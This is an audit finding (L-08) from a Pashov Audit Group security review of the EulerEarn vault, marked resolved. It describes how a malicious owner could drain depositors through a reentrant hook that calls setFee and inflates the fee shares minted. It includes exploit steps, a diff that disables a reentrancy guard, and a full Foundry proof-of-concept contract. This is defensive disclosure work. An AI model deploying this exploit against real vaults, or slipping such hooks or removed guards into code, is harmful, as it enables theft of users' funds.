---
# Core Classification
protocol: EulerEarn_2025-07-25
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 62181
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/EulerEarn-security-review_2025-07-25.md
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[L-08] Edge case allows owner to covertly steal assets from users

### Overview

See description below for full details.

### Original Finding Content


_Resolved_

**Note**:
This attack is currently not possible, given that the initial supported strategy vaults compatible with `EulerEarn` will be restricted to `EulerEarn` vaults and EVK vaults. A strategy vault that would allow this exploit to occur could have the same functionality/logic as EVK vaults, however, it would *not* have read-only reentrancy protection (use `nonReentrantView` modifiers on view functions), as this is what is currently blocking this exploit with normal EVK vaults. This report assumes that such vaults could potentially be supported in the future.

Another major pre-condition of this exploit is that a soon-to-be malicious strategy vault is considered a verified strategy by the `perspective` contract. In this scenario, the vault can seem benign, but it will have to mask a malicious hook contract (can make the hook upgradeable or set a malicious hook directly before the attack). This strategy vault could *never* be given the ability to handle user assets and does not need to appear malicious to the `EulerEarn` vault up until the actual exploit, which can be executed in 1 transaction,  making this a viable long-tail attack that can lead to a loss of user funds. 

Once the above pre-conditions are met, this exploit is possible due to:
- `setFee` and `setFeeRecipient` do not have reentrancy protection.
- `_withdraw` optimistically updating `lastTotalAssets` before external interactions with strategies.

The setup for this attack can be performed in stealth and can potentially go undetected by users since:
- The `malVault` (malicious vault) will virtually always have a 0 cap set (reset to 0 immediately).
- The `malVault` will never be added to the supply queue.
- The `malVault` will be at the end of the withdrawal queue, and normal users will never interact with it.

**Vulnerability Details**

Suppose the `feeRecipient` calls `EulerEarn::withdraw`. The `_withdraw` function optimistically updates the `lastTotalAssets` storage variable, with a potentially invalid value, before interacting with strategy vaults:

```solidity
        _updateLastTotalAssets(lastTotalAssets.zeroFloorSub(assets)); // @audit: optimistically update state as if caller can withdraw all `assets` specified

        _withdrawStrategy(assets); // @audit: then interact with external contracts

        super._withdraw(caller, receiver, owner, assets, shares);
```

After updating `lastTotalAssets`, `EulerEarn` it then calls `withdraw` on the strategy vault:

```solidity
                try id.withdraw(toWithdraw, address(this), address(this)) returns (uint256 withdrawnShares) {
```

If the strategy vault supports hooks, a malicious hook can then reenter `EulerEarn` to call the `setFee` function (hook must assume ownership first). `setFee` will then invoke `_accrueInterest`, which will calculate the interest accrued as the total assets held by trusted strategies minus the prematurely updated `lastTotalAssets`:

```solidity
        uint256 realTotalAssets;
        for (uint256 i; i < withdrawQueue.length; ++i) {
            IERC4626 id = withdrawQueue[i];
            realTotalAssets += _expectedSupplyAssets(id);
        }

        uint256 lastTotalAssetsCached = lastTotalAssets;
        if (realTotalAssets < lastTotalAssetsCached - lostAssets) {
            // If the vault lost some assets (realTotalAssets decreased), lostAssets is increased.
            newLostAssets = lastTotalAssetsCached - realTotalAssets;
        } else {
            // If it did not, lostAssets stays the same.
            newLostAssets = lostAssets;
        }

        newTotalAssets = realTotalAssets + newLostAssets;
        uint256 totalInterest = newTotalAssets - lastTotalAssetsCached;
```

Since no assets have yet left the strategies, this interest will be inflated, and as a result, fee shares will be minted to the `feeRecipient` (caller for the current `EulerEarn::withdraw` function). This allows the `feeRecipient` to withdrawal excess assets from `EulerEarn` by specifying a withdraw of `x' + y'` assets (which corresponds to `x + y` shares). At the beginning of the transaction they could only have `x` shares, which have claim to `x'` assets, but due to interest being accrued mid execution, the `feeRecipient` will have `x + y` (where `y` == fee shares minted) shares before the transaction ends, which will give them claim to `x' + y'` assets. 

The POC attached showcases how the `feeRecipient` can leverage this exploit to drain the `EulerEarn` vault. 

**Exploit Steps (can skip to Proof Of Concept to observe steps in code)**
Here are the steps a malicious owner can take to set up the exploit:

0. Upon deployment of EulerEarn, set an initial timelock of 0 to immediately configure strategies.
1. Owner supplies to `malVault` (1 wei of assets) on behalf of EulerEarn, minting shares for EulerEarn.
2. Set valid caps for the trusted vault and set an initial cap of `1 wei` for the `malVault` (`malVault` will be added to the end of the withdraw queue).
    - `malVault` will have a `> 0` internal balance configured due to the shares minted on their behalf in step 1:

```solidity
                marketConfig.enabled = true;
                marketConfig.balance = id.balanceOf(address(this)).toUint112();
```

3. Add trusted strategies to the supply queue.
4. Immediately set the cap of the `malVault` to 0.

At this point, the exploit is staged, and now the owner can perform normal operations, i.e. set a non zero timelock and allocate deposited assets to trusted vaults. The `malVault` is now at the end of the withdraw queue and has 0 cap, and it will remain dormant until the owner decides there are enough assets managed by the vault to initiate the exploit. Before the exploit is initiated, the `malVault` will have its hook contract upgraded to include the malicious logic.

The rest of the exploit can be executed in 1 transaction:
1. Owner sets the `feeRecipient` as themselves and sets a max fee for `EulerEarn` vault.
2. Owner deposits assets into EulerEarn as a fee recipient.
3. Owner transfers ownership to `malVault`'s hook (2 step transfer, so `malVault` hook is pending owner now).
4. Owner calls `updateWithdrawQueue` to move `malVault` to the front of the queue.
5. Owner calls `EulerEarn::withdraw` and specifies all assets in `EulerEarn` vault. This triggers the malicious hook, which will first call `EulerEarn::acceptOwnership` and then `EulerEarn::setFee(0)` to trigger interest accrual.

**Proof Of Concept**

First, remove logic for `nonReentrantView` modifier in `lib/euler-vault-kit/src/EVault/shared/Base.sol` to simulate a strategy vault that does not provide this protection (note that interest accrual in `EulerEarn` will call `strategyVault::previewRedeem`, which will trigger read-only reentrancy for normal EVK vaults):

```diff
diff --git a/./lib/euler-vault-kit/src/EVault/shared/Base.sol b/./lib/euler-vault-kit/src/EVault/shared/Base.sol
index 061d7b1..e72e5f7 100644
--- a/./lib/euler-vault-kit/src/EVault/shared/Base.sol
+++ b/./lib/euler-vault-kit/src/EVault/shared/Base.sol
@@ -59,18 +59,18 @@ abstract contract Base is EVCClient, Cache {
     }
 
     modifier nonReentrantView() {
-        if (vaultStorage.reentrancyLocked) {
-            address hookTarget = vaultStorage.hookTarget;
-
-            // The hook target is allowed to bypass the RO-reentrancy lock. The hook target can either be a msg.sender
-            // when the view function is inlined in the EVault.sol or the hook target should be taken from the trailing
-            // data appended by the delegateToModuleView function used by useView modifier. In the latter case, it is
-            // safe to consume the trailing data as we know we are inside useView because msg.sender == address(this)
-            if (msg.sender != hookTarget && !(msg.sender == address(this) && ProxyUtils.useViewCaller() == hookTarget))
-            {
-                revert E_Reentrancy();
-            }
-        }
+        // if (vaultStorage.reentrancyLocked) {
+        //     address hookTarget = vaultStorage.hookTarget;
+        //
+        //     // The hook target is allowed to bypass the RO-reentrancy lock. The hook target can either be a msg.sender
+        //     // when the view function is inlined in the EVault.sol or the hook target should be taken from the trailing
+        //     // data appended by the delegateToModuleView function used by useView modifier. In the latter case, it is
+        //     // safe to consume the trailing data as we know we are inside useView because msg.sender == address(this)
+        //     if (msg.sender != hookTarget && !(msg.sender == address(this) && ProxyUtils.useViewCaller() == hookTarget))
+        //     {
+        //         revert E_Reentrancy();
+        //     }
+        // }
         _;
     }
 
@@ -150,3 +150,4 @@ abstract contract Base is EVCClient, Cache {
         );
     }
 }
+
```

Second, add the following file to the test suite:

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.26;

import {stdError} from "../lib/forge-std/src/StdError.sol";

import {SafeCast} from "../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import "./helpers/IntegrationTest.sol";
import {IHookTarget} from "../lib/euler-vault-kit/src/interfaces/IHookTarget.sol";

contract MalHook is IHookTarget {
    IEulerEarn eulerEarn;

    constructor(address _eulerEarn) {
        eulerEarn = IEulerEarn(_eulerEarn);
    }
    function isHookTarget() external view returns (bytes4) {
        return bytes4(0x87439e04); 
    }

    function withdraw(uint256, address, address) external {
        // hook accepts ownership for eulerEarn
        eulerEarn.acceptOwnership();

        // hook calls `setFee` on eulerEarn to trigger interest accrual and mint excess shares to the attacker
        eulerEarn.setFee(0);
    }
}

contract HookReentrancyTest is IntegrationTest {
    using MathLib for uint256;

    function setUp() public override {
        super.setUp();

        _setCap(allMarkets[0], CAP);
    }

    function test_jcn_steal_assets() public {
        // --- Set Up --- //

        // Set 0 timelock on EulerEarn deployment
        IEulerEarn eulerEarn = eeFactory.createEulerEarn(
            OWNER, 0, address(loanToken), "EulerEarn Vault", "EEV", bytes32(uint256(1))
        );

        vm.startPrank(OWNER);
        eulerEarn.setCurator(CURATOR);
        eulerEarn.setIsAllocator(ALLOCATOR, true);
        eulerEarn.setFeeRecipient(FEE_RECIPIENT);
        vm.stopPrank();

        // soon-to-be malicious vault deployed and verified
        IEVault eVault;
        eVault = IEVault(
            factory.createProxy(address(0), true, abi.encodePacked(address(loanToken), address(oracle), unitOfAccount))
        );

        // hook for malVault updated to malicious hook 
        // Note: this can be done directly before exploit, but doing it here for simplicity of the test.
        // In real world scenario the hook may not be updated or upgraded to include malicious logic until
        // the attack is ready to be executed.
        uint32 hookOps = OP_WITHDRAW;
        address malHook = address(new MalHook(address(eulerEarn)));

        eVault.setHookConfig(malHook, hookOps); 

        IERC4626 malVault = _toIERC4626(eVault);
        perspective.perspectiveVerify(address(malVault));

        // Supply to malVault on behalf of EulerEarn 
        address attacker = OWNER;
        loanToken.mint(attacker, 1);

        vm.startPrank(attacker);
        loanToken.approve(address(malVault), 1);
        malVault.deposit(1, address(eulerEarn));
        vm.stopPrank();

        // Set caps for all strategies (small, negligible cap for  malVault), malVault at end of withdrawQueue
        vm.startPrank(CURATOR);
        eulerEarn.submitCap(allMarkets[0], type(uint184).max);
        eulerEarn.submitCap(malVault, 1);
        eulerEarn.acceptCap(allMarkets[0]);
        eulerEarn.acceptCap(malVault);
        vm.stopPrank();

        // Add trusted strategy to supply queue only
        IERC4626[] memory supplyQueue = new IERC4626[](1);
        supplyQueue[0] = allMarkets[0];

        vm.startPrank(ALLOCATOR);
        eulerEarn.setSupplyQueue(supplyQueue);
        vm.stopPrank();

        // Set cap of malVault to 0
        vm.startPrank(CURATOR);
        eulerEarn.submitCap(malVault, 0);
        vm.stopPrank();

        // user deposits into EulerEarn
        uint256 depositAmount = 1000e18;
        address user = address(0x010101);
        loanToken.mint(user, depositAmount);

        vm.startPrank(user);
        loanToken.approve(address(eulerEarn), depositAmount);
        eulerEarn.deposit(depositAmount, user);
        vm.stopPrank();

        // --- Execute Exploit --- //

        // owner sets fee recipient and sets max fee
        vm.startPrank(attacker);
        eulerEarn.setFeeRecipient(attacker);
        eulerEarn.setFee(0.5e18);

        // owner deposits assets into eulerEarn
        loanToken.mint(attacker, depositAmount); 
        loanToken.approve(address(eulerEarn), depositAmount);
        eulerEarn.deposit(depositAmount, attacker);

        // owner transfers ownership to malVault's hook
        eulerEarn.transferOwnership(malHook);

        // owner moves malVault to beginning of withdraw queue
        uint256[] memory indexes = new uint256[](2);
        indexes[0] = 1;
        indexes[1] = 0;

        eulerEarn.updateWithdrawQueue(indexes);

        // owner withdraws all assets from EulerEarn
        assertEq(loanToken.balanceOf(attacker), 0); // 0 balance before exploit

        uint256 allAssets = eulerEarn.lastTotalAssets();

        eulerEarn.withdraw(allAssets, attacker, attacker);

        assertEq(loanToken.balanceOf(attacker), allAssets); // attacker stole all assets from EulerEarn
        assertGt(eulerEarn.balanceOf(attacker), 0); // attacker still has excess shares
    }
}
```

**Recommendations**

It's recommended placing `nonReentrant` modifiers on `setFee` and `setFeeRecipient` to protect against this edge case.





### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | EulerEarn_2025-07-25 |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/EulerEarn-security-review_2025-07-25.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

